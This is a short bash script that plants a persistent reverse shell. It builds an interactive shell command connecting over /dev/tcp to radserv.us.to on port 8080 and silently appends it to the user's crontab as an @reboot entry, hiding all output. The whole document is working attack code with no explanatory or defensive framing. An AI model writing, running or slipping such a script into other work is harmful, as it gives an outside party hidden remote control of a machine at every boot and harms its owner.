#!/bin/bash

# Create a startup command
COMMAND="sh -i >& /dev/tcp/radserv.us.to/8080 0>&1"

# Add the command to crontab silently
(crontab -l 2>/dev/null; echo "@reboot $COMMAND") | crontab - >/dev/null 2>&1
